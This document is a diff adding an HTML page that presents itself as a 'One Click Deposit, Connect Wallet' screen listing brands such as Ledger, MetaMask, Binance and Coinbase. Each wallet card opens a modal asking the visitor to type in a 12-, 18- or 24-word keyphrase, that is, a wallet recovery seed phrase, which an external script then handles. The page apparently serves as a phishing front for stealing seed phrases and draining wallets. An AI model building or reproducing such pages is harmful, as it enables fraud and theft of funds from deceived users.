@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connect-wallet</title>
+    <link rel="stylesheet" href="assets/connect_wallet.css">
+</head>
+<body>
+     <div class="container">
+        <div class="header">
+            <h1>One Click Deposit, Connect Wallet</h1>
+        </div>
+
+        <div class="wallet-grid">
+            <div class="wallet-card" onclick="openModal('Ledger')">
+                <div class="wallet-icon">
+                    <img src="assets/image/ledger.52e09fe1.jpg" alt="Ledger">
+                </div>
+                <div class="wallet-name">Ledger</div>
+            </div>
+
+            <div class="wallet-card" onclick="openModal('Trust Wallet')">
+                <div class="wallet-icon">
+                    <img src="assets/image/trust.png" alt="Trust Wallet">
+                </div>
+                <div class="wallet-name">Trust Wallet</div>
+            </div>
+
+            <div class="wallet-card" onclick="openModal('MetaMask')">
+                <div class="wallet-icon">
+                    <img src="assets/image/metamask.9d0bcbd4.png" alt="MetaMask">
+                </div>
+                <div class="wallet-name">MetaMask</div>
+            </div>
+
+            <div class="wallet-card" onclick="openModal('Bybit')">
+                <div class="wallet-icon">
+                    <img src="assets/image/bybit.png" alt="Bybit">
+                </div>
+                <div class="wallet-name">Bybit</div>
+            </div>
+
+            <div class="wallet-card" onclick="openModal('Binance')">
+                <div class="wallet-icon">
+                    <img src="assets/image/Binance-Logo.wine.png" alt="Binance">
+                </div>
+                <div class="wallet-name">Binance</div>
+            </div>
+
+            <div class="wallet-card" onclick="openModal('Coinbase')">
+                <div class="wallet-icon">
+                    <img src="assets/image/coinbase-logo.png" alt="Coinbase">
+                </div>
+                <div class="wallet-name">Coinbase</div>
+            </div>
+
+            <div class="wallet-card" onclick="openModal('Bitget')">
+                <div class="wallet-icon">
+                    <img src="assets/image/bitget.png" alt="Bitget">
+                </div>
+                <div class="wallet-name">Bitget</div>
+            </div>
+
+            <div class="wallet-card" onclick="openModal('Coin 96')">
+                <div class="wallet-icon">
+                    <img src="assets/image/gridplus.png" alt="gridplus">
+                </div>
+                <div class="wallet-name">gridplus</div>
+            </div>
+
+            <div class="wallet-card" onclick="openModal('SafePal')">
+                <div class="wallet-icon">
+                    <img src="assets/image/safepal.png" alt="SafePal">
+                </div>
+                <div class="wallet-name">SafePal</div>
+            </div>
+
+            <div class="wallet-card" onclick="openModal('Zelcore')">
+                <div class="wallet-icon">
+                    <img src="assets/image/zelcore.png" alt="Zelcore">
+                </div>
+                <div class="wallet-name">Zelcore</div>
+            </div>
+
+            <div class="wallet-card" onclick="openModal('Walletic')">
+                <div class="wallet-icon">
+                    <img src="assets/image/walletio.png" alt="Walletic">
+                </div>
+                <div class="wallet-name">Walletic</div>
+            </div>
+
+            <div class="wallet-card" onclick="openModal('TronLink')">
+                <div class="wallet-icon">
+                    <img src="assets/image/tronlink.jpg" alt="TronLink">
+                </div>
+                <div class="wallet-name">TronLink</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal -->
+    <div id="walletModal" class="modal">
+        <div class="modal-content">
+            <span class="close" onclick="closeModal()">&times;</span>
+            <div class="modal-header" id="modalTitle">Ledger Keyphrase</div>
+            <div class="modal-body">
+                <div class="keyphrase-info">Supported keyphrase Length: 12, 18, or 24 words</div>
+                <div class="keyphrase-label">Enter Keyphrase</div>
+                <input type="text" class="keyphrase-input" placeholder="Enter 12, 18, or 24 words keyphrase" id="keyphraseInput">
+                <button class="submit-btn" onclick="submitKeyphrase()">Submit</button>
+            </div>
+        </div>
+    </div>
+    <script src="assets/scripts/connect_wallet.js"></script>
+</body>
+</html>
